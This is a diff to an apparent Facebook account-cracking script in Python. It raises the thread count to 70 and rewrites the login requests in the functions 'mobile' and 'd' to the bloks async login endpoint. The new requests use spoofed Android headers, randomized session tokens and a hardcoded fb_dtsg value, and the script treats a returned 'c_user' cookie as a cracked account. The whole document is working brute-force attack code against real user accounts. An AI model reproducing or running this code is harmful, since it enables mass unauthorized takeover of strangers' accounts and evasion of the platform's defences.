@@ -629,7 +629,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=50) as SUMON_xd:
+    with ThreadPool(max_workers=70) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -1531,43 +1531,45 @@ def mobile(uid,pwx,tl):
             proxs= {'http': nip}
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com').text
-            data = {
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            'email': uid,
-            'login_source': 'comet_headerless_login',
-            'next': '',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
-            cookies = {
-            'ps_n': '1',
-            'ps_l': '1',
-            'sb': 'vv1mZoqkaQr8BYILQ8WaAKOT',
-            'datr': 'PJp1ZglQIotPNJW3IGpT68nu',
-            'wd': '1440x828',
-            'fr': '13YOXbxepaC7m0H48.AWVYRBjGvSTLvjgk7zcWGpPevjI.BnUJm2..AAA.0.0.BnUJni.AWX03bkSKQY',}
+            data =  {
+            "__aaid": "0",
+            "__user": "0",
+            "__a": "1",
+            "__req": random.choice(string.digits+string.ascii_lowercase),
+            "__hs": "20288.BP:wbloks_caa_pkg.2.0...0",
+            "dpr": "3",
+            "__ccg": "GOOD",
+            "__rev": str(random.randint(1000000000,1999999999)),
+            "__s": ''.join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(3)),
+            "__hsi": str(int(time.time() * 10000000)),
+            "__dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde0UE",
+            "fb_dtsg": "NAft3Lu00KNQqyHWkhB4fx1fkrSJWLAN5PdbzCPQx3u2ZbuPz-tL4_A:0:0",
+            "jazoest": re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            "lsd": re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+            "params": "{\"params\":\"{\\\"server_params\\\":{\\\"credential_type\\\":\\\"password\\\",\\\"username_text_input_id\\\":\\\"4rsdpc:69\\\",\\\"password_text_input_id\\\":\\\"4rsdpc:70\\\",\\\"login_source\\\":\\\"Login\\\",\\\"login_credential_type\\\":\\\"none\\\",\\\"server_login_source\\\":\\\"login\\\",\\\"ar_event_source\\\":\\\"login_home_page\\\",\\\"should_trigger_override_login_success_action\\\":0,\\\"should_trigger_override_login_2fa_action\\\":0,\\\"is_caa_perf_enabled\\\":0,\\\"reg_flow_source\\\":\\\"login_home_native_integration_point\\\",\\\"caller\\\":\\\"gslr\\\",\\\"is_from_landing_page\\\":0,\\\"is_from_empty_password\\\":0,\\\"is_from_aymh\\\":0,\\\"is_from_password_entry_page\\\":0,\\\"is_from_assistive_id\\\":0,\\\"is_from_msplit_fallback\\\":0,\\\"two_step_login_type\\\":\\\"one_step_login\\\",\\\"is_vanilla_password_page_empty_password\\\":0,\\\"INTERNALlatency_qpl_marker_id\\\":36707139,\\\"INTERNALlatency_qpl_instance_id\\\":\\\"28853846400427\\\",\\\"device_id\\\":null,\\\"family_device_id\\\":null,\\\"waterfall_id\\\":\\\""+str(uuid.uuid4())+"\\\",\\\"offline_experiment_group\\\":null,\\\"layered_homepage_experiment_group\\\":null,\\\"is_platform_login\\\":0,\\\"is_from_logged_in_switcher\\\":0,\\\"is_from_logged_out\\\":0,\\\"access_flow_version\\\":\\\"pre_mt_behavior\\\"},\\\"client_input_params\\\":{\\\"machine_id\\\":\\\"\\\",\\\"cloud_trust_token\\\":null,\\\"block_store_machine_id\\\":\\\"\\\",\\\"contact_point\\\":\\\""+uid+"\\\",\\\"password\\\":\\\""+pw+"\\\",\\\"accounts_list\\\":[],\\\"fb_ig_device_id\\\":[],\\\"secure_family_device_id\\\":\\\"\\\",\\\"encrypted_msisdn\\\":\\\"\\\",\\\"headers_infra_flow_id\\\":\\\"\\\",\\\"try_num\\\":1,\\\"login_attempt_count\\\":1,\\\"event_flow\\\":\\\"login_manual\\\",\\\"event_step\\\":\\\"home_page\\\",\\\"openid_tokens\\\":{},\\\"auth_secure_device_id\\\":\\\"\\\",\\\"client_known_key_hash\\\":\\\"\\\",\\\"has_whatsapp_installed\\\":0,\\\"sso_token_map_json_string\\\":\\\"\\\",\\\"should_show_nested_nta_from_aymh\\\":0,\\\"password_contains_non_ascii\\\":\\\"false\\\",\\\"has_granted_read_contacts_permissions\\\":0,\\\"has_granted_read_phone_permissions\\\":0,\\\"app_manager_id\\\":\\\"\\\",\\\"aymh_accounts\\\":[{\\\"id\\\":\\\"\\\",\\\"profiles\\\":{\\\"id\\\":{\\\"user_id\\\":\\\"\\\",\\\"name\\\":\\\"\\\",\\\"profile_picture_url\\\":\\\"\\\",\\\"small_profile_picture_url\\\":null,\\\"notification_count\\\":0,\\\"credential_type\\\":\\\"none\\\",\\\"token\\\":\\\"\\\",\\\"last_access_time\\\":0,\\\"is_derived\\\":0,\\\"username\\\":\\\"\\\",\\\"password\\\":\\\"\\\",\\\"has_smartlock\\\":0,\\\"account_center_id\\\":\\\"\\\",\\\"account_source\\\":\\\"\\\",\\\"credentials\\\":[],\\\"nta_eligibility_reason\\\":null,\\\"from_accurate_privacy_result\\\":0,\\\"dbln_validated\\\":0}}}],\\\"lois_settings\\\":{\\\"lois_token\\\":\\\"\\\"}}}\"}"}
             headers = {
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'content-type': 'application/x-www-form-urlencoded',
-            'dpr': '1',
-            'origin': 'https://www.facebook.com',
-            'priority': 'u=0, i',
-            'referer': 'https://www.facebook.com/?ref=homescreenpwa',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Microsoft Edge";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
-            'sec-ch-ua-full-version-list': '"Microsoft Edge";v="131.0.2903.70", "Chromium";v="131.0.6778.86", "Not_A Brand";v="24.0.0.0"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-model': '""',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-ch-ua-platform-version': '"10.0.0"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0',
-            'viewport-width': '1440',}
+            "method": "POST",
+            "authority": "mbasic.facebook.com",
+            "path": "/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=cba7c509d2c2601260f158a954901cf09c991ec4f39a21fcf9329ba34d9ea5c3",
+            "scheme": "https",
+            "content-length": str(len(str(data))),
+            "sec-ch-ua": "\"Not/A)Brand\";v=\"99\", \"Google Chrome\";v=\"115\", \"Chromium\";v=\"115\"",
+            "sec-ch-ua-mobile": "?1",
+            "user-agent": dev_fban(),
+            "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
+            "sec-ch-ua-platform-version": "\"11.0.0\"",
+            "sec-ch-ua-full-version-list": "\"Not/A)Brand\";v=\"99.0.0.0\", \"Google Chrome\";v=\"115.0.5790.21\", \"Chromium\";v=\"115.0.5790.21\"",
+            "sec-ch-ua-model": "\"Redmi note 9 pro\"",
+            "sec-ch-prefers-color-scheme": "dark",
+            "sec-ch-ua-platform": "\"Android\"",
+            "accept": "*/*",
+            "origin": "https://mbasic.facebook.com",
+            "sec-fetch-site": "same-origin",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-dest": "empty",
+            "referer": "https://mbasic.facebook.com/", 
+            "accept-encoding": "gzip, deflate, br",
+            "accept-language": "en-US,en;q=0.9",}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
             url = 'https://www.facebook.com/login/?privacy_mutation_token=eyJ0eXBlIjowLCJjcmVhdGlvbl90aW1lIjoxNzMzMzM1NTA0LCJjYWxsc2l0ZV9pZCI6MzgxMjI5MDc5NTc1OTQ2fQ%3D%3D&next'
             po = Session.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False).text
@@ -1724,35 +1726,19 @@ def d(uid,pwx,tl):
             ua = 'Mozilla/5.0 (Linux; U; Android 11; RMX3241 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36 OPR/62.4.2254.61190|"Not:A-Brand";v="99", "Chromium";v="98"|11|98.0.4758.101'
             Session = requests.Session()
             free_fb = Session.get('https://m.facebook.com/').text
-            cookies = {
-            'datr': 'eL_uZ2Ty3h0loiAu7Is5kJfa',
-            'sb': 'eL_uZ9ijCdro7wndMVgTyIBo',
-            'ps_l': '1',
-            'ps_n': '1',
-            'vpd': 'v1%3B754x393x2.75',
-            'locale': 'en_US',
-            'wl_cbv': 'v2%3Bclient_version%3A2839%3Btimestamp%3A1749279032',
-            'dpr': '3.0234789848327637',
-            'm_pixel_ratio': '2.75',
-            'wd': '393x895',
-            'fr': '1luwxyfC0S3PqSGOB.AWdHWSlIFgbTsyGIpb0ybBWJfd90ljXfeYezIDp1sNzBIA5oVJU.BoRC9Z..AAA.0.0.BoRDJU.AWcx--m4gr-h5rmVlUlEexIex9Y',}
-            params = {
-            'appid': 'com.bloks.www.bloks.caa.login.async.send_login_request',
-            'type': 'action',
-            '__bkv': 'e787cb1606ebe4cc6aaf5a1ce304f07c3da0663045060614c1cd6806596c46e6',}
             data = {
-    '__aaid': '0',
-    '__user': '0',
-    '__a': '1',
-    '__req': 'a',
-    '__hs': '20246.BP:wbloks_caa_pkg.2.0...0',
-    'dpr': '3',
-    '__ccg': 'EXCELLENT',
-    '__rev': '1023608600',
-    '__s': ':f95eey:i9v0n0',
-    '__hsi': '7513185148771233093',
-    '__dyn': '0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde',
-    'fb_dtsg': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+    "__aaid": "0",
+    "__user": "0",
+    "__a": "1",
+    "__req": random.choice(string.digits+string.ascii_lowercase),
+    "__hs": "20288.BP:wbloks_caa_pkg.2.0...0",
+    "dpr": "3",
+    "__ccg": "GOOD",
+    "__rev": str(random.randint(1000000000,1999999999)),
+    "__s": ''.join(''.join(random.choices(string.ascii_lowercase, k=6)) for _ in range(3)),
+    "__hsi": str(int(time.time() * 10000000)),
+    "__dyn": "0wzpawlE72fDg9ppo5S12wAxu13wqobE6u7E39x60lW4o3Bw4Ewk9E4W099w2s8hw73wGw6tw5Uw64w8W1uwf20n6aw8m0zE2ZwrU6q3a0le0iS2eU2dwde0UE",
+    "fb_dtsg": "NAft3Lu00KNQqyHWkhB4fx1fkrSJWLAN5PdbzCPQx3u2ZbuPz-tL4_A:0:0",
     'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
     'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
     'params': json.dumps({
@@ -1846,8 +1832,8 @@ def d(uid,pwx,tl):
             'accept-encoding': 'gzip, deflate, br',
             'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://p.facebook.com/async/wbloks/fetch/"
-            po = Session.post(url, params=params, data=data, cookies=cookies, headers=headers).text
+            url = 'https://mbasic.facebook.com/async/wbloks/fetch/?appid=com.bloks.www.bloks.caa.login.async.send_login_request&type=action&__bkv=702c2f684e5cb91415ff73ea04c6b82d5580487fbd0a90975765b0adee500940'
+            po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
                 cok = Session.cookies.get_dict()
